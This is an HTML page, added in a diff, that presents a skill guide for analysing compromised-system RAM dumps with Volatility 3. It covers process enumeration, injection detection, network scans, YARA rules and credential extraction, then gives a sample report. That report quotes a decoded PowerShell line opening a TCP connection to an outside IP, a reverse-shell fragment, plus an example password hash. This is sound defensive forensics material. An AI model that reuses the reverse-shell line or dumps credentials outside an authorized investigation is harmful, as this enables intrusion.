@@ -1,0 +1,363 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>analyzing-memory-dumps-with-volatility - Skill Reader</title>
+  <style>
+    :root {
+      color-scheme: dark;
+      --bg: #151515;
+      --panel: #1c1c1c;
+      --panel-2: #222;
+      --text: #f2f2f2;
+      --muted: #c6c6c6;
+      --subtle: #969696;
+      --line: #303030;
+      --accent: #5cc8ff;
+      --code: #2a2a2a;
+    }
+    :root[data-theme="light"] {
+      color-scheme: light;
+      --bg: #f7f8fb;
+      --panel: #ffffff;
+      --panel-2: #f0f3f8;
+      --text: #171b22;
+      --muted: #394556;
+      --subtle: #637085;
+      --line: #dce3ee;
+      --accent: #1767d6;
+      --code: #eef2f7;
+    }
+    * { box-sizing: border-box; }
+    body { margin: 0; background: var(--bg); color: var(--text); font: 16px/1.7 -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, sans-serif; }
+    .shell { width: min(980px, calc(100% - 32px)); margin: 0 auto; padding: 32px 0 72px; }
+    .topbar { position: sticky; top: 0; z-index: 5; display: flex; align-items: center; justify-content: space-between; gap: 12px; border-bottom: 1px solid var(--line); background: color-mix(in srgb, var(--bg) 86%, transparent); padding: 14px 0; backdrop-filter: blur(16px); }
+    .crumbs, .actions { display: flex; flex-wrap: wrap; align-items: center; gap: 8px; }
+    a, button { color: var(--text); }
+    .pill, .theme { display: inline-flex; min-height: 34px; align-items: center; border: 1px solid var(--line); border-radius: 999px; background: var(--panel-2); font-size: 13px; font-weight: 700; padding: 6px 10px; text-decoration: none; }
+    .theme { cursor: pointer; }
+    .hero { border-bottom: 1px solid var(--line); padding: 34px 0 26px; }
+    .source { color: var(--accent); font: 800 12px/1 ui-monospace, SFMono-Regular, Menlo, monospace; letter-spacing: .14em; text-transform: uppercase; }
+    h1 { margin: 12px 0 10px; font-size: clamp(2.2rem, 5vw, 4.8rem); line-height: .95; letter-spacing: 0; }
+    .description { max-width: 820px; margin: 0; color: var(--muted); font-size: 18px; }
+    .meta { display: grid; grid-template-columns: repeat(auto-fit, minmax(220px, 1fr)); gap: 10px; margin: 22px 0 0; }
+    .meta-card { border: 1px solid var(--line); border-radius: 10px; background: var(--panel); padding: 12px; }
+    .meta-card strong { display: block; color: var(--subtle); font-size: 12px; text-transform: uppercase; }
+    .meta-card span { display: block; margin-top: 4px; overflow-wrap: anywhere; font-family: ui-monospace, SFMono-Regular, Menlo, monospace; font-size: 13px; }
+    .usage { border-bottom: 1px solid var(--line); padding: 24px 0; }
+    .usage h2 { margin: 0 0 6px; font-size: 1.45rem; }
+    .usage-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(240px, 1fr)); gap: 10px; margin-top: 16px; }
+    .usage-card { border: 1px solid var(--line); border-radius: 10px; background: var(--panel); padding: 12px; }
+    .usage-card strong { display: block; margin-bottom: 6px; }
+    .usage-card p { margin: 0; color: var(--muted); }
+    article { max-width: 860px; padding-top: 22px; }
+    h2, h3, h4, h5 { line-height: 1.2; margin: 1.65em 0 .55em; }
+    h2 { font-size: 1.65rem; }
+    h3 { font-size: 1.25rem; color: var(--text); }
+    p { margin: .75em 0; color: var(--muted); }
+    ul, ol { margin: .55em 0 1.1em; padding-left: 1.35em; color: var(--muted); }
+    li { margin: .32em 0; }
+    strong { color: var(--text); }
+    code { border: 1px solid var(--line); border-radius: 5px; background: var(--code); color: var(--text); font: .92em ui-monospace, SFMono-Regular, Menlo, monospace; padding: .12em .35em; }
+    pre { overflow: auto; border: 1px solid var(--line); border-radius: 10px; background: var(--code); padding: 16px; }
+    pre code { border: 0; background: transparent; padding: 0; }
+    blockquote { border-left: 3px solid var(--accent); margin: 1em 0; background: var(--panel); color: var(--muted); padding: 10px 14px; }
+    hr { border: 0; border-top: 1px solid var(--line); margin: 28px 0; }
+    @media (max-width: 720px) { .topbar { align-items: flex-start; flex-direction: column; } .shell { width: min(100% - 24px, 980px); } }
+  </style>
+</head>
+<body>
+  <div class="shell">
+    <div class="topbar">
+      <div class="crumbs">
+        <a class="pill" href="../index.html">Skills Directory</a>
+        <span class="pill">Codex</span>
+      </div>
+      <div class="actions">
+        <button class="theme" id="themeButton" type="button">Toggle theme</button>
+        <a class="pill" href="../skill-md/analyzing-memory-dumps-with-volatility-codex.md">Markdown</a>
+        <button class="theme" id="copyButton" type="button">Copy skill</button>
+        <button class="theme" id="downloadButton" type="button">Download</button>
+      </div>
+    </div>
+    <header class="hero">
+      <div class="source">Codex / Security, forensics, and incident response</div>
+      <h1>analyzing-memory-dumps-with-volatility</h1>
+      <p class="description">'Analyzes RAM memory dumps from compromised systems using the Volatility framework to identify malicious processes,</p>
+      <section class="meta">
+        <div class="meta-card"><strong>platform</strong><span>Codex</span></div>
+<div class="meta-card"><strong>category</strong><span>Security, forensics, and incident response</span></div>
+<div class="meta-card"><strong>display name</strong><span>analyzing-memory-dumps-with-volatility</span></div>
+<div class="meta-card"><strong>canonical name</strong><span>analyzing-memory-dumps-with-volatility</span></div>
+      </section>
+    </header>
+    <section class="usage">
+      <h2>When To Use This Skill</h2>
+      <p>'Analyzes RAM memory dumps from compromised systems using the Volatility framework to identify malicious processes,</p>
+      <div class="usage-grid">
+        <div class="usage-card"><strong>How to call it in Codex</strong><p>In Codex, click the chat box, press /, choose analyzing-memory-dumps-with-volatility, then write the task. Fallback prompt: Use the analyzing-memory-dumps-with-volatility skill to...</p></div>
+        <div class="usage-card"><strong>Friend-safe copy</strong><p>This public page removes local filesystem paths, Finder-only links, and machine-specific source locations.</p></div>
+      </div>
+    </section>
+    <article>
+      <h2>Analyzing Memory Dumps with Volatility</h2>
+<h3>When to Use</h3>
+<ul>
+<li>A compromised system's RAM has been captured and needs forensic analysis for malware artifacts</li>
+<li>Detecting fileless malware that exists only in memory without persistent disk artifacts</li>
+<li>Extracting encryption keys, passwords, or decrypted configuration from process memory</li>
+<li>Identifying process injection, DLL injection, or process hollowing in a compromised system</li>
+<li>Analyzing rootkit activity that hides from standard disk-based forensic tools</li>
+</ul>
+<p><strong>Do not use</strong> for disk image analysis; use Autopsy, FTK, or Sleuth Kit for disk forensics.</p>
+<h3>Prerequisites</h3>
+<ul>
+<li>Volatility 3 installed (<code>pip install volatility3</code>) with symbol tables for target OS</li>
+<li>Memory dump file acquired from the target system (using WinPmem, LiME, or DumpIt)</li>
+<li>Knowledge of the source OS version for correct profile/symbol selection</li>
+<li>Sufficient disk space (memory dumps can be 4-64 GB)</li>
+<li>YARA rules for scanning memory for known malware signatures</li>
+<li>Strings utility for extracting readable strings from memory regions</li>
+</ul>
+<h3>Workflow</h3>
+<h4>Step 1: Identify the Memory Dump Profile</h4>
+<p>Determine the operating system and version from the memory dump:</p>
+<pre><code># Volatility 3: Automatic OS detection
+vol3 -f memory.dmp windows.info
+
+# List available plugins
+vol3 -f memory.dmp --help
+
+# If symbols are needed, download from:
+# https://downloads.volatilityfoundation.org/volatility3/symbols/
+
+# For Volatility 2 (legacy):
+vol2 -f memory.dmp imageinfo
+vol2 -f memory.dmp kdbgscan</code></pre>
+<h4>Step 2: Enumerate Running Processes</h4>
+<p>List all processes and identify suspicious entries:</p>
+<pre><code># List all processes
+vol3 -f memory.dmp windows.pslist
+
+# Process tree (parent-child relationships)
+vol3 -f memory.dmp windows.pstree
+
+# Scan for hidden/unlinked processes (rootkit detection)
+vol3 -f memory.dmp windows.psscan
+
+# Compare pslist vs psscan to find hidden processes
+# Processes in psscan but not pslist are potentially hidden by rootkits
+
+# Check for process hollowing
+vol3 -f memory.dmp windows.pslist --dump
+# Then verify the dumped EXE matches the expected binary on disk</code></pre>
+<pre><code>Suspicious Process Indicators:
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+- svchost.exe not spawned by services.exe (wrong parent)
+- csrss.exe/lsass.exe with unusual parent process
+- Multiple instances of lsass.exe (should be only one)
+- Processes with misspelled names (scvhost.exe, lssas.exe)
+- cmd.exe or powershell.exe spawned by WINWORD.EXE or browser
+- Processes running from unusual paths (%TEMP%, %APPDATA%)
+- Processes with no parent (orphaned - parent terminated)</code></pre>
+<h4>Step 3: Detect Malicious Code Injection</h4>
+<p>Scan for injected code and process hollowing:</p>
+<pre><code># Detect injected code in processes (malfind)
+vol3 -f memory.dmp windows.malfind
+
+# Malfind looks for:
+# - Memory regions with PAGE_EXECUTE_READWRITE protection
+# - Memory regions containing PE headers (MZ/PE signature)
+# - VAD (Virtual Address Descriptor) anomalies
+
+# Dump injected memory regions for analysis
+vol3 -f memory.dmp windows.malfind --dump --pid 2184
+
+# List loaded DLLs per process
+vol3 -f memory.dmp windows.dlllist --pid 2184
+
+# Detect hollowed processes by comparing mapped image to disk
+vol3 -f memory.dmp windows.hollowfind
+
+# Scan for loaded drivers (potential rootkit drivers)
+vol3 -f memory.dmp windows.driverscan
+
+# List kernel modules
+vol3 -f memory.dmp windows.modules</code></pre>
+<h4>Step 4: Analyze Network Connections</h4>
+<p>Extract active and closed network connections:</p>
+<pre><code># List all network connections (active and listening)
+vol3 -f memory.dmp windows.netscan
+
+# Output columns: Offset, Protocol, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner
+
+# Filter for established connections to external IPs
+vol3 -f memory.dmp windows.netscan | grep ESTABLISHED
+
+# For older Windows (XP/2003):
+vol3 -f memory.dmp windows.netstat
+
+# Cross-reference PIDs with process list
+# Suspicious: svchost.exe connected to external IP on non-standard port
+# Suspicious: notepad.exe or calc.exe with network connections</code></pre>
+<h4>Step 5: Extract Artifacts and Credentials</h4>
+<p>Recover sensitive data from memory:</p>
+<pre><code># Dump process memory for a specific PID
+vol3 -f memory.dmp windows.memmap --dump --pid 2184
+
+# Extract command-line history
+vol3 -f memory.dmp windows.cmdline
+
+# Extract environment variables
+vol3 -f memory.dmp windows.envars --pid 2184
+
+# Registry analysis (extract Run keys for persistence)
+vol3 -f memory.dmp windows.registry.printkey \
+  --key &quot;Software\Microsoft\Windows\CurrentVersion\Run&quot;
+
+# Extract hashed/cached credentials
+vol3 -f memory.dmp windows.hashdump
+vol3 -f memory.dmp windows.cachedump
+vol3 -f memory.dmp windows.lsadump
+
+# Extract clipboard contents
+vol3 -f memory.dmp windows.clipboard
+
+# File extraction from memory
+vol3 -f memory.dmp windows.filescan | grep -i &quot;payload\|malware\|suspicious&quot;
+vol3 -f memory.dmp windows.dumpfiles --virtaddr 0xFA8001234560</code></pre>
+<h4>Step 6: Scan Memory with YARA Rules</h4>
+<p>Apply YARA signatures to detect known malware in memory:</p>
+<pre><code># Scan entire memory dump with YARA rules
+vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar
+
+# Scan specific process memory
+vol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar --pid 2184
+
+# Built-in YARA scan for common patterns
+vol3 -f memory.dmp yarascan.YaraScan --yara-rules &quot;rule FindC2 { strings: \$s1 = \&quot;gate.php\&quot; condition: \$s1 }&quot;
+
+# Scan for encryption key material
+vol3 -f memory.dmp yarascan.YaraScan --yara-rules &quot;rule AES_Key { strings: \$sbox = { 63 7C 77 7B F2 6B 6F C5 } condition: \$sbox }&quot;</code></pre>
+<h4>Step 7: Timeline and Report Generation</h4>
+<p>Create an analysis timeline and compile findings:</p>
+<pre><code># Generate comprehensive timeline
+vol3 -f memory.dmp timeliner.Timeliner --output-file timeline.csv
+
+# Timeline includes:
+# - Process creation/exit times
+# - Network connection timestamps
+# - Registry modification times
+# - File access times
+
+# Export process list for reporting
+vol3 -f memory.dmp windows.pslist --output csv &gt; processes.csv
+
+# Export network connections
+vol3 -f memory.dmp windows.netscan --output csv &gt; network.csv</code></pre>
+<h3>Key Concepts</h3>
+<p>| Term | Definition | |------|------------| | <strong>Memory Forensics</strong> | Analysis of volatile memory (RAM) contents to identify running processes, network connections, and in-memory artifacts that may not exist on disk | | <strong>Process Hollowing</strong> | Malware technique of creating a legitimate process in suspended state, replacing its memory with malicious code, then resuming execution | | <strong>Malfind</strong> | Volatility plugin detecting injected code by identifying memory regions with executable permissions and PE headers in non-image VADs | | <strong>VAD (Virtual Address Descriptor)</strong> | Windows kernel structure tracking memory regions allocated to a process; anomalies in VADs indicate injection or hollowing | | <strong>EPROCESS</strong> | Windows kernel structure representing a process; rootkits unlink EPROCESS entries to hide processes from standard tools | | <strong>Pool Tag Scanning</strong> | Memory forensics technique scanning for kernel object pool tags to find objects (processes, files, connections) even when unlinked | | <strong>Fileless Malware</strong> | Malware that operates entirely in memory without creating files on disk; only detectable through memory forensics |</p>
+<h3>Tools &amp; Systems</h3>
+<ul>
+<li><strong>Volatility 3</strong>: Open-source memory forensics framework supporting Windows, Linux, and macOS memory analysis with plugin architecture</li>
+<li><strong>WinPmem</strong>: Memory acquisition tool for Windows systems that creates raw memory dumps for offline analysis</li>
+<li><strong>LiME (Linux Memory Extractor)</strong>: Loadable kernel module for capturing Linux system memory dumps</li>
+<li><strong>Rekall</strong>: Alternative memory forensics framework with some unique analysis capabilities (discontinued but still useful)</li>
+<li><strong>MemProcFS</strong>: Memory process file system allowing mounting memory dumps as file systems for intuitive analysis</li>
+</ul>
+<h3>Common Scenarios</h3>
+<h4>Scenario: Detecting Fileless Malware After EDR Alert</h4>
+<p><strong>Context</strong>: EDR detected suspicious PowerShell activity but the threat actor cleaned up disk artifacts. A memory dump was captured before the system was rebooted. The analysis needs to identify the malware, its persistence mechanism, and any lateral movement.</p>
+<p><strong>Approach</strong>:</p>
+<ol>
+<li>Run <code>windows.pstree</code> to identify the process chain (which process spawned PowerShell)</li>
+<li>Run <code>windows.malfind</code> to detect injected code in running processes</li>
+<li>Dump the suspicious process memory and extract strings for C2 URLs</li>
+<li>Run <code>windows.netscan</code> to identify network connections from the compromised processes</li>
+<li>Run <code>windows.cmdline</code> to see what commands PowerShell executed</li>
+<li>Scan with YARA rules for known malware families in the dumped process memory</li>
+<li>Extract credentials with <code>hashdump</code> and <code>lsadump</code> to assess lateral movement risk</li>
+</ol>
+<p><strong>Pitfalls</strong>:</p>
+<ul>
+<li>Using the wrong symbol tables for the OS version (causes plugin failures or incorrect results)</li>
+<li>Not comparing <code>pslist</code> vs <code>psscan</code> output (missing rootkit-hidden processes)</li>
+<li>Ignoring legitimate processes that have been injected into (focus on malfind results, not just process names)</li>
+<li>Not extracting full process memory before concluding analysis (strings from process dump may reveal additional IOCs)</li>
+</ul>
+<h3>Output Format</h3>
+<pre><code>MEMORY FORENSICS ANALYSIS REPORT
+===================================
+Dump File:        memory.dmp
+Dump Size:        16 GB
+OS Version:       Windows 10 21H2 (Build 19044)
+Capture Tool:     WinPmem 4.0
+Capture Time:     2025-09-15 14:35:00 UTC
+
+SUSPICIOUS PROCESSES
+PID   PPID  Name              Path                                    Anomaly
+2184  1052  svchost.exe       C:\Users\Admin\AppData\Temp\svchost.exe Wrong path
+4012  2184  powershell.exe    C:\Windows\System32\powershell.exe      Child of fake svchost
+3456  4012  cmd.exe           C:\Windows\System32\cmd.exe             Spawned by PowerShell
+
+CODE INJECTION DETECTED (malfind)
+PID 852 (explorer.exe):
+  Address: 0x00400000  Size: 98304  Protection: PAGE_EXECUTE_READWRITE
+  Header: MZ (embedded PE detected)
+  SHA-256 of dump: abc123def456...
+
+NETWORK CONNECTIONS
+PID   Process         Local           Foreign              State
+2184  svchost.exe     10.1.5.42:49152 185.220.101.42:443   ESTABLISHED
+4012  powershell.exe  10.1.5.42:49200 91.215.85.17:8080    ESTABLISHED
+
+EXTRACTED CREDENTIALS
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0
+
+COMMAND LINE HISTORY
+PID 4012: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==
+  Decoded: $client = New-Object System.Net.Sockets.TCPClient(&quot;185.220.101.42&quot;,443)
+
+YARA MATCHES
+PID 2184: rule CobaltStrike_Beacon { matched at 0x00401200 }
+
+TIMELINE
+14:10:00  svchost.exe (PID 2184) created from C:\Users\Admin\AppData\Temp\
+14:10:05  Network connection to 185.220.101.42:443 established
+14:12:30  powershell.exe (PID 4012) spawned by svchost.exe
+14:15:00  Code injection into explorer.exe (PID 852) detected
+14:20:00  Credential dump from LSASS process</code></pre>
+    </article>
+  </div>
+  <script type="application/json" id="skillPackage">"---\nname: analyzing-memory-dumps-with-volatility\ndisplay_name: analyzing-memory-dumps-with-volatility\nplatform: Codex\ncategory: Security, forensics, and incident response\n---\n\n# analyzing-memory-dumps-with-volatility - Codex Skill Package\n\n## What This Is\n\nThis is a friend-safe Markdown copy of `analyzing-memory-dumps-with-volatility` for Codex. It removes local filesystem paths, Finder-only links, and machine-specific source locations.\n\n## When To Use This Skill\n\nUse this skill when your task matches this description:\n\n- A compromised system's RAM has been captured and needs forensic analysis for malware artifacts\n\n## How To Use It In Codex\n\nIn Codex, click the chat box, press /, choose analyzing-memory-dumps-with-volatility, then write the task. Fallback prompt: Use the analyzing-memory-dumps-with-volatility skill to...\n\n## Skill Metadata\n\n| Field | Value |\n| --- | --- |\n| Display name | `analyzing-memory-dumps-with-volatility` |\n| Canonical name | `analyzing-memory-dumps-with-volatility` |\n| Platform | `Codex` |\n| Category | Security, forensics, and incident response |\n\n## Description\n\n- A compromised system's RAM has been captured and needs forensic analysis for malware artifacts\n\n## Original SKILL.md\n\n---\nname: analyzing-memory-dumps-with-volatility\ndescription: 'Analyzes RAM memory dumps from compromised systems using the Volatility framework to identify malicious processes,\n  injected code, network connections, loaded modules, and extracted credentials. Supports Windows, Linux, and macOS memory\n  forensics. Activates for requests involving memory forensics, RAM analysis, volatile data examination, process injection\n  detection, or memory-resident malware investigation.\n\n  '\ndomain: cybersecurity\nsubdomain: malware-analysis\ntags:\n- malware\n- memory-forensics\n- Volatility\n- RAM-analysis\n- incident-response\nmitre_attack:\n- T1055\n- T1003\n- T1059\n- T1620\nversion: 1.0.0\nauthor: mahipal\nlicense: Apache-2.0\nnist_csf:\n- DE.AE-02\n- RS.AN-03\n- ID.RA-01\n- DE.CM-01\n---\n\n# Analyzing Memory Dumps with Volatility\n\n## When to Use\n\n- A compromised system's RAM has been captured and needs forensic analysis for malware artifacts\n- Detecting fileless malware that exists only in memory without persistent disk artifacts\n- Extracting encryption keys, passwords, or decrypted configuration from process memory\n- Identifying process injection, DLL injection, or process hollowing in a compromised system\n- Analyzing rootkit activity that hides from standard disk-based forensic tools\n\n**Do not use** for disk image analysis; use Autopsy, FTK, or Sleuth Kit for disk forensics.\n\n## Prerequisites\n\n- Volatility 3 installed (`pip install volatility3`) with symbol tables for target OS\n- Memory dump file acquired from the target system (using WinPmem, LiME, or DumpIt)\n- Knowledge of the source OS version for correct profile/symbol selection\n- Sufficient disk space (memory dumps can be 4-64 GB)\n- YARA rules for scanning memory for known malware signatures\n- Strings utility for extracting readable strings from memory regions\n\n## Workflow\n\n### Step 1: Identify the Memory Dump Profile\n\nDetermine the operating system and version from the memory dump:\n\n```bash\n# Volatility 3: Automatic OS detection\nvol3 -f memory.dmp windows.info\n\n# List available plugins\nvol3 -f memory.dmp --help\n\n# If symbols are needed, download from:\n# https://downloads.volatilityfoundation.org/volatility3/symbols/\n\n# For Volatility 2 (legacy):\nvol2 -f memory.dmp imageinfo\nvol2 -f memory.dmp kdbgscan\n```\n\n### Step 2: Enumerate Running Processes\n\nList all processes and identify suspicious entries:\n\n```bash\n# List all processes\nvol3 -f memory.dmp windows.pslist\n\n# Process tree (parent-child relationships)\nvol3 -f memory.dmp windows.pstree\n\n# Scan for hidden/unlinked processes (rootkit detection)\nvol3 -f memory.dmp windows.psscan\n\n# Compare pslist vs psscan to find hidden processes\n# Processes in psscan but not pslist are potentially hidden by rootkits\n\n# Check for process hollowing\nvol3 -f memory.dmp windows.pslist --dump\n# Then verify the dumped EXE matches the expected binary on disk\n```\n\n```\nSuspicious Process Indicators:\n━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n- svchost.exe not spawned by services.exe (wrong parent)\n- csrss.exe/lsass.exe with unusual parent process\n- Multiple instances of lsass.exe (should be only one)\n- Processes with misspelled names (scvhost.exe, lssas.exe)\n- cmd.exe or powershell.exe spawned by WINWORD.EXE or browser\n- Processes running from unusual paths (%TEMP%, %APPDATA%)\n- Processes with no parent (orphaned - parent terminated)\n```\n\n### Step 3: Detect Malicious Code Injection\n\nScan for injected code and process hollowing:\n\n```bash\n# Detect injected code in processes (malfind)\nvol3 -f memory.dmp windows.malfind\n\n# Malfind looks for:\n# - Memory regions with PAGE_EXECUTE_READWRITE protection\n# - Memory regions containing PE headers (MZ/PE signature)\n# - VAD (Virtual Address Descriptor) anomalies\n\n# Dump injected memory regions for analysis\nvol3 -f memory.dmp windows.malfind --dump --pid 2184\n\n# List loaded DLLs per process\nvol3 -f memory.dmp windows.dlllist --pid 2184\n\n# Detect hollowed processes by comparing mapped image to disk\nvol3 -f memory.dmp windows.hollowfind\n\n# Scan for loaded drivers (potential rootkit drivers)\nvol3 -f memory.dmp windows.driverscan\n\n# List kernel modules\nvol3 -f memory.dmp windows.modules\n```\n\n### Step 4: Analyze Network Connections\n\nExtract active and closed network connections:\n\n```bash\n# List all network connections (active and listening)\nvol3 -f memory.dmp windows.netscan\n\n# Output columns: Offset, Protocol, LocalAddr, LocalPort, ForeignAddr, ForeignPort, State, PID, Owner\n\n# Filter for established connections to external IPs\nvol3 -f memory.dmp windows.netscan | grep ESTABLISHED\n\n# For older Windows (XP/2003):\nvol3 -f memory.dmp windows.netstat\n\n# Cross-reference PIDs with process list\n# Suspicious: svchost.exe connected to external IP on non-standard port\n# Suspicious: notepad.exe or calc.exe with network connections\n```\n\n### Step 5: Extract Artifacts and Credentials\n\nRecover sensitive data from memory:\n\n```bash\n# Dump process memory for a specific PID\nvol3 -f memory.dmp windows.memmap --dump --pid 2184\n\n# Extract command-line history\nvol3 -f memory.dmp windows.cmdline\n\n# Extract environment variables\nvol3 -f memory.dmp windows.envars --pid 2184\n\n# Registry analysis (extract Run keys for persistence)\nvol3 -f memory.dmp windows.registry.printkey \\\n  --key \"Software\\Microsoft\\Windows\\CurrentVersion\\Run\"\n\n# Extract hashed/cached credentials\nvol3 -f memory.dmp windows.hashdump\nvol3 -f memory.dmp windows.cachedump\nvol3 -f memory.dmp windows.lsadump\n\n# Extract clipboard contents\nvol3 -f memory.dmp windows.clipboard\n\n# File extraction from memory\nvol3 -f memory.dmp windows.filescan | grep -i \"payload\\|malware\\|suspicious\"\nvol3 -f memory.dmp windows.dumpfiles --virtaddr 0xFA8001234560\n```\n\n### Step 6: Scan Memory with YARA Rules\n\nApply YARA signatures to detect known malware in memory:\n\n```bash\n# Scan entire memory dump with YARA rules\nvol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar\n\n# Scan specific process memory\nvol3 -f memory.dmp yarascan.YaraScan --yara-file malware_rules.yar --pid 2184\n\n# Built-in YARA scan for common patterns\nvol3 -f memory.dmp yarascan.YaraScan --yara-rules \"rule FindC2 { strings: \\$s1 = \\\"gate.php\\\" condition: \\$s1 }\"\n\n# Scan for encryption key material\nvol3 -f memory.dmp yarascan.YaraScan --yara-rules \"rule AES_Key { strings: \\$sbox = { 63 7C 77 7B F2 6B 6F C5 } condition: \\$sbox }\"\n```\n\n### Step 7: Timeline and Report Generation\n\nCreate an analysis timeline and compile findings:\n\n```bash\n# Generate comprehensive timeline\nvol3 -f memory.dmp timeliner.Timeliner --output-file timeline.csv\n\n# Timeline includes:\n# - Process creation/exit times\n# - Network connection timestamps\n# - Registry modification times\n# - File access times\n\n# Export process list for reporting\nvol3 -f memory.dmp windows.pslist --output csv > processes.csv\n\n# Export network connections\nvol3 -f memory.dmp windows.netscan --output csv > network.csv\n```\n\n## Key Concepts\n\n| Term | Definition |\n|------|------------|\n| **Memory Forensics** | Analysis of volatile memory (RAM) contents to identify running processes, network connections, and in-memory artifacts that may not exist on disk |\n| **Process Hollowing** | Malware technique of creating a legitimate process in suspended state, replacing its memory with malicious code, then resuming execution |\n| **Malfind** | Volatility plugin detecting injected code by identifying memory regions with executable permissions and PE headers in non-image VADs |\n| **VAD (Virtual Address Descriptor)** | Windows kernel structure tracking memory regions allocated to a process; anomalies in VADs indicate injection or hollowing |\n| **EPROCESS** | Windows kernel structure representing a process; rootkits unlink EPROCESS entries to hide processes from standard tools |\n| **Pool Tag Scanning** | Memory forensics technique scanning for kernel object pool tags to find objects (processes, files, connections) even when unlinked |\n| **Fileless Malware** | Malware that operates entirely in memory without creating files on disk; only detectable through memory forensics |\n\n## Tools & Systems\n\n- **Volatility 3**: Open-source memory forensics framework supporting Windows, Linux, and macOS memory analysis with plugin architecture\n- **WinPmem**: Memory acquisition tool for Windows systems that creates raw memory dumps for offline analysis\n- **LiME (Linux Memory Extractor)**: Loadable kernel module for capturing Linux system memory dumps\n- **Rekall**: Alternative memory forensics framework with some unique analysis capabilities (discontinued but still useful)\n- **MemProcFS**: Memory process file system allowing mounting memory dumps as file systems for intuitive analysis\n\n## Common Scenarios\n\n### Scenario: Detecting Fileless Malware After EDR Alert\n\n**Context**: EDR detected suspicious PowerShell activity but the threat actor cleaned up disk artifacts. A memory dump was captured before the system was rebooted. The analysis needs to identify the malware, its persistence mechanism, and any lateral movement.\n\n**Approach**:\n1. Run `windows.pstree` to identify the process chain (which process spawned PowerShell)\n2. Run `windows.malfind` to detect injected code in running processes\n3. Dump the suspicious process memory and extract strings for C2 URLs\n4. Run `windows.netscan` to identify network connections from the compromised processes\n5. Run `windows.cmdline` to see what commands PowerShell executed\n6. Scan with YARA rules for known malware families in the dumped process memory\n7. Extract credentials with `hashdump` and `lsadump` to assess lateral movement risk\n\n**Pitfalls**:\n- Using the wrong symbol tables for the OS version (causes plugin failures or incorrect results)\n- Not comparing `pslist` vs `psscan` output (missing rootkit-hidden processes)\n- Ignoring legitimate processes that have been injected into (focus on malfind results, not just process names)\n- Not extracting full process memory before concluding analysis (strings from process dump may reveal additional IOCs)\n\n## Output Format\n\n```\nMEMORY FORENSICS ANALYSIS REPORT\n===================================\nDump File:        memory.dmp\nDump Size:        16 GB\nOS Version:       Windows 10 21H2 (Build 19044)\nCapture Tool:     WinPmem 4.0\nCapture Time:     2025-09-15 14:35:00 UTC\n\nSUSPICIOUS PROCESSES\nPID   PPID  Name              Path                                    Anomaly\n2184  1052  svchost.exe       C:\\Users\\Admin\\AppData\\Temp\\svchost.exe Wrong path\n4012  2184  powershell.exe    C:\\Windows\\System32\\powershell.exe      Child of fake svchost\n3456  4012  cmd.exe           C:\\Windows\\System32\\cmd.exe             Spawned by PowerShell\n\nCODE INJECTION DETECTED (malfind)\nPID 852 (explorer.exe):\n  Address: 0x00400000  Size: 98304  Protection: PAGE_EXECUTE_READWRITE\n  Header: MZ (embedded PE detected)\n  SHA-256 of dump: abc123def456...\n\nNETWORK CONNECTIONS\nPID   Process         Local           Foreign              State\n2184  svchost.exe     10.1.5.42:49152 185.220.101.42:443   ESTABLISHED\n4012  powershell.exe  10.1.5.42:49200 91.215.85.17:8080    ESTABLISHED\n\nEXTRACTED CREDENTIALS\nAdministrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0\n\nCOMMAND LINE HISTORY\nPID 4012: powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==\n  Decoded: $client = New-Object System.Net.Sockets.TCPClient(\"185.220.101.42\",443)\n\nYARA MATCHES\nPID 2184: rule CobaltStrike_Beacon { matched at 0x00401200 }\n\nTIMELINE\n14:10:00  svchost.exe (PID 2184) created from C:\\Users\\Admin\\AppData\\Temp\\\n14:10:05  Network connection to 185.220.101.42:443 established\n14:12:30  powershell.exe (PID 4012) spawned by svchost.exe\n14:15:00  Code injection into explorer.exe (PID 852) detected\n14:20:00  Credential dump from LSASS process\n```\n\n"</script>
+  <script>
+    const root = document.documentElement;
+    const saved = localStorage.getItem("skills-reader-theme") || "dark";
+    const skillPackage = JSON.parse(document.getElementById("skillPackage").textContent || '""');
+    function setTheme(theme) {
+      root.dataset.theme = theme;
+      localStorage.setItem("skills-reader-theme", theme);
+    }
+    function downloadText(filename, value) {
+      const blob = new Blob([value], { type: "text/markdown;charset=utf-8" });
+      const url = URL.createObjectURL(blob);
+      const link = document.createElement("a");
+      link.href = url;
+      link.download = filename;
+      document.body.appendChild(link);
+      link.click();
+      link.remove();
+      URL.revokeObjectURL(url);
+    }
+    document.getElementById("themeButton").addEventListener("click", () => setTheme(root.dataset.theme === "light" ? "dark" : "light"));
+    document.getElementById("copyButton").addEventListener("click", async () => {
+      await navigator.clipboard.writeText(skillPackage);
+      document.getElementById("copyButton").textContent = "Copied";
+      setTimeout(() => document.getElementById("copyButton").textContent = "Copy skill", 1100);
+    });
+    document.getElementById("downloadButton").addEventListener("click", () => downloadText("analyzing-memory-dumps-with-volatility-codex-skill.md", skillPackage));
+    setTheme(saved);
+  </script>
+</body>
+</html>
